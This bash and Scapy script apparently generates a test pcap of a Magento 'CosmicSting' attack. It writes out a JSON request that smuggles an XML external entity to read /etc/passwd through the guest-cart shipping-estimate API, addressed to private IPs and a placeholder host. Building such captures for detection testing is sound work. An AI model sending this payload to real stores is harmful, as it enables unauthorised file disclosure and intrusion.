#!/usr/bin/env bash
set -euo pipefail
OUT="${1:?usage: poc.sh <out.pcap>}"
python3 - "$OUT" <<'PY'
import sys
from scapy.all import wrpcap, Ether, IP, TCP, Raw
# CosmicSting: XML SOAP gadget inside the JSON guest-cart estimate body.
body=(b'{"address":{"totalsCollector":{"_data":"<?xml version=\\"1.0\\"?>'
      b'<!DOCTYPE root [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]>'
      b'<root xmlns:xsi=\\"http://www.w3.org/2001/XMLSchema-instance\\">'
      b'<key xsi:type=\\"SimpleXMLElement\\">&xxe;</key></root>"}}}')
req=b"POST /rest/V1/guest-carts/MASKED/estimate-shipping-methods HTTP/1.1\r\nHost: magento.example\r\nContent-Type: application/json\r\nContent-Length: "+str(len(body)).encode()+b"\r\nConnection: close\r\n\r\n"+body
S="10.0.0.76";D="10.0.0.80"
C=lambda f,s,a,p=b"":Ether()/IP(src=S,dst=D)/TCP(sport=44545,dport=80,flags=f,seq=s,ack=a)/(Raw(p) if p else b"")
V=lambda f,s,a:Ether()/IP(src=D,dst=S)/TCP(sport=80,dport=44545,flags=f,seq=s,ack=a)
pk=[C("S",1000,0),V("SA",2000,1001),C("A",1001,2001),C("PA",1001,2001,req),V("A",2001,1001+len(req))]
t=1_700_000_000.0
for p in pk:p.time=t;t+=0.01
wrpcap(sys.argv[1],pk)
PY
